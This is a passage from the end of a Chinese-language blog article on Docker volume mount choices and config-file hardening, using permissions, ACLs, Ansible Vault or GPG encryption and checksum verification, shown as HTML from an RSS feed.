<span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ <span class="hljs-variable">$ENV</span> 环境配置生成完成"</span>
</code></pre>
<h2 data-id="heading-30">七、生产环境最佳实践</h2>
<h3 data-id="heading-31">7.1 挂载方式选择指南</h3>









































<table><thead><tr><th>数据类型</th><th>推荐挂载方式</th><th>理由</th><th>示例</th></tr></thead><tbody><tr><td><strong>应用配置</strong>​</td><td>绑定挂载</td><td>四大优势完美契合配置管理</td><td><code>./config:/app/config</code></td></tr><tr><td><strong>数据库数据</strong>​</td><td>命名卷</td><td>Docker 管理、备份方便</td><td><code>db_data:/var/lib/mysql</code></td></tr><tr><td><strong>日志文件</strong>​</td><td>目录挂载</td><td>实时查看、日志收集</td><td><code>./logs:/app/logs</code></td></tr><tr><td><strong>临时缓存</strong>​</td><td>匿名卷</td><td>自动清理、性能好</td><td>不配置 volumes</td></tr><tr><td><strong>敏感数据</strong>​</td><td>命名卷 + 加密</td><td>安全隔离</td><td><code>encrypted_volume:/secrets</code></td></tr></tbody></table>
<h3 data-id="heading-32">7.2 配置文件绑定的安全加固</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 配置文件权限控制</span>
<span class="hljs-built_in">chmod</span> 600 broker.conf                    <span class="hljs-comment"># 只允许所有者读写</span>
<span class="hljs-built_in">chown</span> root:root broker.conf             <span class="hljs-comment">#  root 用户所有权</span>
setfacl -m u:spring:r broker.conf       <span class="hljs-comment"># 容器用户只读权限</span>

<span class="hljs-comment"># 2. 配置加密存储</span>
ansible-vault encrypt broker.conf       <span class="hljs-comment"># Ansible Vault 加密</span>
gpg --encrypt --recipient devops@company.com broker.conf  <span class="hljs-comment"># GPG 加密</span>

<span class="hljs-comment"># 3. 配置完整性验证</span>
<span class="hljs-built_in">sha256sum</span> broker.conf &gt; broker.conf.sha256
<span class="hljs-comment"># 部署前验证</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-subst">$(cat broker.conf.sha256)</span> broker.conf"</span> | <span class="hljs-built_in">sha256sum</span> -c
</code></pre>
<p><strong>好的配置管理是成功部署的基石</strong>，合理运用这些挂载策略，将极大提升您的 DevOps 效率和系统可靠性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>